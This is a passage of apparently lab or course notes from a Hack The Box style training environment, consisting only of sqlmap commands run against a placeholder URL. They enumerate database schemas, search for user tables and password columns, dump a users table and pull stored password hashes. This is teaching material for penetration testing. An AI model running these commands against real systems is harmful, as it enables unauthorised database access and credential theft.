...
```shell-session
anasec@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --schema
...
```shell-session
anasec@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --search -T user
...
```shell-session
anasec@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --search -C pass
...
```shell-session
anasec@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -D master -T users
...
```shell-session
anasec@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --passwords --batch
